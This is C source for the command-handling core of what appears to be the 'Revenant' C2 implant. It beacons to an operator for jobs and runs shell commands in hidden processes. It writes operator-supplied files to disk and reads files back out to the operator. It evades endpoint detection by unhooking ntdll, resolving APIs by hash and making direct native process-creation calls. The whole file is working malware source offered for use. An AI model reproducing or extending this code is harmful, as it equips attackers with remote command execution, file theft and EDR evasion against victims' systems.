#include "Asm.h"
#include "Dbg.h"
#include "Defs.h"
#include "Core.h"
#include "Poly.h"
#include "Config.h"
#include "Package.h"
#include "Command.h"
#include "Revenant.h"
#include "Obfuscation.h"
#include "Utilities.h"


#include <tchar.h>

#define RVNT_COMMAND_LENGTH 6

// TODO: ADD COMMANDS
// TODO: Clean code base, consistent naming
// TODO: Make typing more consistent

RVNT_COMMAND Commands[RVNT_COMMAND_LENGTH] = {
        { .ID = COMMAND_SHELL,            .Function = CommandShell },
        { .ID = COMMAND_PWSH,             .Function = CommandShell },
        { .ID = COMMAND_DOWNLOAD,         .Function = CommandDownload },
        { .ID = COMMAND_UPLOAD,           .Function = CommandUpload },
        { .ID = COMMAND_EXIT,             .Function = CommandExit },
};

VOID CommandDispatcher() {
    PPACKAGE Package     = NULL;
    PARSER   Parser      = { 0 };
    PVOID    DataBuffer  = NULL;
    SIZE_T   DataSize    = 0;
    DWORD    TaskCommand;
#if CONFIG_UNHOOK == TRUE
#if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
    PVOID p_ntdll = get_ntdll_64();
#else
    PVOID p_ntdll = get_ntdll_32();
#endif //CONFIG_ARCH
    IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) p_ntdll;
    IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (p_ntdll + pDosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;

    SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
    // allocate local buffer to hold temporary copy of ntdll from remote process
    LPVOID pCacheRestore = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
    LPVOID pCacheClean = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);

    mem_cpy(pCacheRestore, p_ntdll, ntdll_size);
#endif //unhook

    do {
        if(!Instance.Session.Connected) {
            // if there's no connection, return out of here
            return;
        }

        // sleep
        Sleep( Instance.Config.Sleeping * 1000 );

        Package = PackageCreate( COMMAND_GET_JOB );

        PackageAddInt32( Package, Instance.Session.AgentID );
        PackageTransmit( Package, &DataBuffer, &DataSize );

        if(DataBuffer && DataSize > 0) {
            // PRINT_HEX(DataBuffer, (int)DataSize)
            ParserNew(&Parser, DataBuffer, DataSize);
            do {
                TaskCommand = ParserGetInt32(&Parser);
                if(TaskCommand != COMMAND_NO_JOB) {
                    // _tprintf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );

                    BOOL FoundCommand = FALSE;
                    for ( UINT32 FunctionCounter = 0; FunctionCounter < RVNT_COMMAND_LENGTH; FunctionCounter++ ) {
                        if ( Commands[FunctionCounter].ID == TaskCommand) {

                            // unhook
#if CONFIG_UNHOOK
                            HookingManager(TRUE, pCacheClean, p_ntdll, ntdll_size);
#endif
                            // execute command
                            Commands[FunctionCounter].Function(&Parser);

                            // rehook
#if CONFIG_UNHOOK
                            HookingManager(FALSE, pCacheRestore, p_ntdll, ntdll_size);
#endif
                            FoundCommand = TRUE;
                            break;
                        }
                    }


                    if ( ! FoundCommand ) {
                        // Command not found


                    }
                } else {
                    // No Job


                }
            } while ( Parser.Length > 4 );

            mem_set(DataBuffer, 0, DataSize);
            LocalFree(*(PVOID *)DataBuffer);
            DataBuffer = NULL;

            ParserDestroy(&Parser);
        } else {
            // Connection failed

            break;
        }

    } while(TRUE);

    Instance.Session.Connected = FALSE;
}

VOID CommandShell( PPARSER Parser ){

#if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
    PVOID p_ntdll = get_ntdll_64();
#else
    PVOID p_ntdll = get_ntdll_32();
#endif //CONFIG_ARCH

#if CONFIG_NATIVE == TRUE

    DWORD   Length           = 0;
    PCHAR   Command          = NULL;
    HANDLE  hStdInPipeRead   = NULL;
    HANDLE  hStdInPipeWrite  = NULL;
    HANDLE  hStdOutPipeRead  = NULL;
    HANDLE  hStdOutPipeWrite = NULL;

    PPS_ATTRIBUTE_LIST attrib_list = NULL;
    PSECTION_IMAGE_INFORMATION sec_img_info = NULL;
    PCLIENT_ID client_id = NULL;

    SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    Command = ParserGetBytes(Parser, (PUINT32) &Length);

    if (CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
        return;

    if (CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
        return;

    UNICODE_STRING nt_image_path;
    UNICODE_STRING nt_args;

    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);

    // hardcoded test string
    //g_rtl_init_unicode_string(&nt_image_path, (PWSTR)L"\\??\\C:\\Windows\\System32\\cmd.exe");

    // split command and args
    CHAR command_str[MAX_PATH];
    CHAR arg_str[MAX_PATH];

    // copy command line (cmd.exe /c XXXXX)
    mem_cpy(command_str,Command,Length);

    // split command line
    PCHAR * command_array = split_first_space(command_str);

    // get command file path
    PCHAR cmd_file = str_dup(command_array[0]);

    // get args
    mem_cpy(arg_str,command_array[1],str_len(command_array[1]));
    arg_str[str_len(command_array[1])] = 0x0;

    // normalize command file path
    normalize_path(cmd_file);

    // make wide command and args
    PWSTR wide_command = str_to_wide(cmd_file);
    PWSTR wide_args = str_to_wide(arg_str);


    // make the command line
    PWCHAR command_w_space = wide_concat(wide_command, L" ");
    PWCHAR command_line = wide_concat(command_w_space,wide_args);
    LocalFree(*(PVOID *)command_w_space);

    // unicode str
    p_RtlInitUnicodeString(&nt_image_path, wide_command);
    p_RtlInitUnicodeString(&nt_args, wide_args);

    // _tprintf("Command Line:%ls\n", command_line);

    PRTL_USER_PROCESS_PARAMETERS proc_params = { 0 };

    // create process params struct
    RtlCreateProcessParametersEx_t p_RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t) GetProcAddressByHash(p_ntdll, RtlCreateProcessParametersEx_CRC32B);
    check_debug(p_RtlCreateProcessParametersEx(&proc_params, &nt_image_path,
                                               NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
                                               0x01) == 0, "RtlCreateProcessParametersEx Failed!");

    // create info struct
    PS_CREATE_INFO create_info = { 0 };
    create_info.Size = sizeof(create_info);
    create_info.State = PsCreateInitialState;

    // set some parameters
    proc_params->CommandLine.Buffer = command_line;
    proc_params->CommandLine.Length = MAX_PATH;
    proc_params->WindowFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; // Hide Window 0x00000001 | Use STD handles 0x100

    // Setup handle array
    HANDLE handle_array[3] = { hStdInPipeRead, hStdOutPipeWrite, hStdOutPipeWrite };

    // set std error/out/in:
    proc_params->StandardError   = handle_array[2];
    proc_params->StandardOutput  = handle_array[1];
    proc_params->StandardInput   = handle_array[0];

    // allocate process heap
    RtlAllocateHeap_t p_RtlAllocateHeap = (RtlAllocateHeap_t) GetProcAddressByHash(p_ntdll, RtlAllocateHeap_CRC32B);

    // get heaps
    // RtlGetProcessHeaps_t p_RtlGetProcessHeaps = (RtlGetProcessHeaps_t) GetProcAddressByHash(p_ntdll, RtlGetProcessHeaps_CRC32B);

    // make attributes
    // OBJECT_ATTRIBUTES obj_attrib = {sizeof(OBJECT_ATTRIBUTES)};
    // PPS_STD_HANDLE_INFO std_handle_info = (PPS_STD_HANDLE_INFO)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
    client_id = (PCLIENT_ID) p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
    attrib_list = (PS_ATTRIBUTE_LIST *) p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
    sec_img_info = (PSECTION_IMAGE_INFORMATION) p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));

    attrib_list->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - (sizeof(PS_ATTRIBUTE));
    attrib_list->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attrib_list->Attributes[0].Size = nt_image_path.Length;
    attrib_list->Attributes[0].Value = (ULONG_PTR)nt_image_path.Buffer;

    HANDLE h_proc, h_thread = NULL;
    NtCreateUserProcess_t p_NtCreateUserProcess = (NtCreateUserProcess_t) GetProcAddressByHash(p_ntdll, NtCreateUserProcess_CRC32B);

    check_debug(p_NtCreateUserProcess(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL,
                                      PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info,
                                      attrib_list) == 0, "NtCreateUserProcess Failed!");

    RtlFreeHeap_t p_RtlFreeHeap = (RtlFreeHeap_t) GetProcAddressByHash(p_ntdll, RtlFreeHeap_CRC32B);

    LEAVE:
    if(attrib_list != NULL){
        p_RtlFreeHeap(RtlProcessHeap(), 0, attrib_list);
    }
    if(sec_img_info != NULL){
        p_RtlFreeHeap(RtlProcessHeap(), 0, sec_img_info);
    }
    if(client_id != NULL){
        p_RtlFreeHeap(RtlProcessHeap(), 0, client_id);
    }

    LocalFree(*(PVOID *)wide_command);
    LocalFree(*(PVOID *)wide_args);
    LocalFree(*(PVOID *)command_array);
    LocalFree(*(PVOID *)cmd_file);
    LocalFree(*(PVOID *)command_line);

    RtlDestroyProcessParameters_t p_RtlDestroyProcessParameters = (RtlDestroyProcessParameters_t) GetProcAddressByHash(p_ntdll, RtlDestroyProcessParameters_CRC32B);

    p_RtlDestroyProcessParameters(proc_params);


    CloseHandle( hStdOutPipeWrite );
    CloseHandle( hStdInPipeRead );

    AnonPipeRead( hStdOutPipeRead );

    CloseHandle( hStdOutPipeRead );
    CloseHandle( hStdInPipeWrite );

#else

    DWORD   Length           = 0;
    PCHAR   Command          = NULL;
    HANDLE  hStdInPipeRead   = NULL;
    HANDLE  hStdInPipeWrite  = NULL;
    HANDLE  hStdOutPipeRead  = NULL;
    HANDLE  hStdOutPipeWrite = NULL;

    PROCESS_INFORMATION ProcessInfo     = { };
    SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
    STARTUPINFOA        StartUpInfoA    = { };

    Command = ParserGetBytes(Parser, (PUINT32) &Length);

    if (CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
        return;

    if (CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
        return;

    StartUpInfoA.cb         = sizeof( STARTUPINFOA );

    StartUpInfoA.dwFlags    = STARTF_USESTDHANDLES;
    StartUpInfoA.hStdError  = hStdOutPipeWrite;
    StartUpInfoA.hStdOutput = hStdOutPipeWrite;
    StartUpInfoA.hStdInput  = hStdInPipeRead;

    if ( CreateProcessA( NULL, Command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo ) == FALSE )
        return;

    CloseHandle( hStdOutPipeWrite );
    CloseHandle( hStdInPipeRead );

    AnonPipeRead( hStdOutPipeRead );

    CloseHandle( hStdOutPipeRead );
    CloseHandle( hStdInPipeWrite );
#endif // CONFIG_NATIVE

}

VOID CommandUpload( PPARSER Parser ) {

//--------------------------------

#if CONFIG_NATIVE == TRUE

#if CONFIG_ARCH == 64
    PVOID p_ntdll = get_ntdll_64();
#else
    PVOID p_ntdll = get_ntdll_32();
#endif //CONFIG_ARCH

    // UCHAR s_xk[] = S_XK;
    // UCHAR s_string[] = S_COMMAND_UPLOAD;
    // _tprintf("%s\n", xor_dec((char *) s_string, sizeof(s_string), (char *) s_xk, sizeof(s_xk)));

    PPACKAGE Package = PackageCreate(COMMAND_UPLOAD);
    UINT32 FileSize = 0;
    UINT32 NameSize = 0;
    DWORD Written = 0;
    PCHAR FileName = ParserGetBytes(Parser, &NameSize);
    PVOID Content = ParserGetBytes(Parser, &FileSize);
    HANDLE hFile = NULL;

    FileName[NameSize] = 0;

    // FIX THIS STRING
    // _tprintf("FileName => %s (FileSize: %d)\n", FileName, FileSize);

    NTSTATUS status;
    UNICODE_STRING file_path;
    CHAR file_name[MAX_PATH] = { 0 };
    mem_cpy(file_name,FileName, NameSize - 1);
    NameSize = NameSize - 1;

    // FIX THIS STRING
    // _tprintf("Before: %s\n", file_name);

    normalize_path(file_name);

    // FIX THIS STRING
    // _tprintf("Normalized: %s\n", file_name);

    WCHAR *w_file_path = str_to_wide(file_name);

    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
    p_RtlInitUnicodeString(&file_path, w_file_path);


    OBJECT_ATTRIBUTES obj_attrs;
    IO_STATUS_BLOCK io_status_block;


    InitializeObjectAttributes(&obj_attrs, &file_path, 0x00000040L, NULL, NULL);
    NtCreateFile_t p_NtCreateFile = GetProcAddressByHash(p_ntdll, NtCreateFile_CRC32B);

    check_debug(p_NtCreateFile(&hFile, FILE_GENERIC_WRITE, &obj_attrs, &io_status_block, NULL,
                               FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF,
                               FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL,
                               0) == 0, "NtCreateFile Failed!");

    NtWriteFile_t p_NtWriteFile = GetProcAddressByHash(p_ntdll, NtWriteFile_CRC32B);
    check_debug(p_NtWriteFile(hFile, NULL, NULL, NULL, &io_status_block,
                              Content, FileSize-1, 0, 0) == 0, "NtWriteFile Failed!");

    Written = io_status_block.Information;

    PackageAddInt32(Package, FileSize-1);
    PackageAddBytes(Package, (PUCHAR) FileName, NameSize);
    PackageTransmit(Package, NULL, NULL);

    LEAVE:
    LocalFree(w_file_path);
    CloseHandle(hFile);
    hFile = NULL;

#else //CONFIG_NATIVE

    // _tprintf("Command::Upload\n");

    PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
    UINT32   FileSize = 0;
    UINT32   NameSize = 0;
    DWORD    Written  = 0;
    PCHAR    FileName = ParserGetBytes( Parser, &NameSize );
    PVOID    Content  = ParserGetBytes( Parser, &FileSize );
    HANDLE   hFile    = NULL;

    FileName[ NameSize ] = 0;

    // _tprintf( "FileName => %s (FileSize: %d)\n", FileName, FileSize );

    hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );

    check_debug(hFile != INVALID_HANDLE_VALUE, "CreateFileA Failed!");

    check_debug(WriteFile( hFile, Content, FileSize,
                           &Written, NULL) != 0, "WriteFile Failed!");

    PackageAddInt32( Package, FileSize );
    PackageAddBytes( Package, (PUCHAR)FileName, NameSize );
    PackageTransmit( Package, NULL, NULL );

    LEAVE:
    CloseHandle( hFile );
    hFile = NULL;
#endif // CONFIG_NATIVE
}



VOID CommandDownload( PPARSER Parser ) {
#if CONFIG_ARCH == 64
    PVOID p_ntdll = get_ntdll_64();
#else
    PVOID p_ntdll = get_ntdll_32();
#endif //CONFIG_ARCH

//--------------------------------
#if CONFIG_NATIVE == TRUE
    // UCHAR s_xk[] = S_XK;
    // UCHAR s_string[] = S_COMMAND_DOWNLOAD;
    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));

    PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
    DWORD    FileSize = 0;
    DWORD    Read     = 0;
    DWORD    NameSize = 0;
    PCHAR    FileName = ParserGetBytes(Parser, (PUINT32) &NameSize);
    HANDLE   hFile    = NULL;
    PVOID    Content  = NULL;

    FileName[ NameSize ] = 0;
    //PCHAR FileName = "C:/Temp/test.txt\0";
    /*NameSize  = strlen(FileName);
    // _tprintf( "FileName => %s\n", FileName );
    // _tprintf("Old NameSize => %d\n", NameSize);
    // _tprintf("Strlen of FileName =>%d\n", strlen(FileName));
     */
    NTSTATUS status;
    UNICODE_STRING file_path;
    CHAR file_name[MAX_PATH] = { 0 };
    mem_cpy(file_name,FileName, NameSize - 2);
    NameSize = str_len(file_name);

    // FIX THIS STRING
    // _tprintf("Before: %s\n", file_name);

    normalize_path(file_name);

    // FIX THIS STRING
    // _tprintf("Normalized: %s\n", file_name);


    WCHAR *w_file_path = str_to_wide(file_name);
    RtlInitUnicodeString_t p_RtlInitUnicodeString = GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
    p_RtlInitUnicodeString(&file_path, w_file_path);
    LocalFree(w_file_path);
    OBJECT_ATTRIBUTES obj_attrs;
    IO_STATUS_BLOCK io_status_block;

    InitializeObjectAttributes(&obj_attrs, &file_path, 0x00000040L, NULL, NULL);


    NtOpenFile_t p_NtOpenFile = GetProcAddressByHash(p_ntdll, NtOpenFile_CRC32B);

    check_debug(p_NtOpenFile(&hFile, FILE_GENERIC_READ, &obj_attrs, &io_status_block, FILE_SHARE_READ,
                             FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) == 0, "NtOpenFile Failed!");

    FILE_STANDARD_INFORMATION file_standard_info;
    NtQueryInformationFile_t p_NtQueryInformationFile = GetProcAddressByHash(p_ntdll, NtQueryInformationFile_CRC32B);
    check_debug(p_NtQueryInformationFile(hFile, &io_status_block,
                                         &file_standard_info, sizeof(FILE_STANDARD_INFORMATION),
                                         FileStandardInformation) == 0,"NtQueryInformationFile Failed!");

    FileSize = file_standard_info.EndOfFile.QuadPart;
    // _tprintf("file_size: %d\n", FileSize);
    Content  = LocalAlloc( LPTR, FileSize );

    NtReadFile_t p_NtReadFile = GetProcAddressByHash(p_ntdll, NtReadFile_CRC32B);
    check_debug( p_NtReadFile(hFile, NULL, NULL, NULL,
                              &io_status_block, Content, FileSize, NULL, NULL) == 0, "NtReadFile Failed!");

    Read += io_status_block.Information;

    //Read = io_status_block.Information;
    PackageAddBytes( Package, FileName, NameSize);
    PackageAddBytes( Package, Content,  FileSize);

    PackageTransmit( Package, NULL, NULL );

#else //CONFIG_NATIVE
    // _tprintf("Command::Download\n");

//--------------------------------

    PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
    DWORD    FileSize = 0;
    DWORD    Read     = 0;
    DWORD    NameSize = 0;
    PCHAR    FileName = ParserGetBytes(Parser, (PUINT32) &NameSize);
    HANDLE   hFile    = NULL;
    PVOID    Content  = NULL;

    FileName[ NameSize ] = 0;

    // _tprintf( "FileName => %s\n", FileName );

    hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );

    check_debug( !(( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE )), "CreateFileA Failed!" );

    FileSize = GetFileSize( hFile, 0 );
    Content  = LocalAlloc( LPTR, FileSize );

    check_debug(ReadFile( hFile, Content, FileSize, &Read, NULL ) != 0, "ReadFile Failed!" );

    PackageAddBytes( Package, FileName, NameSize );
    PackageAddBytes( Package, Content,  FileSize );

    PackageTransmit( Package, NULL, NULL );
#endif

    LEAVE:
    if ( hFile ){
        CloseHandle( hFile );
        hFile = NULL;
    }

    if ( Content ){
        mem_set( Content, 0, FileSize );
        LocalFree( Content );
        Content = NULL;
    }

}

VOID CommandExit( PPARSER Parser ) {
    ExitProcess( 0 );
}

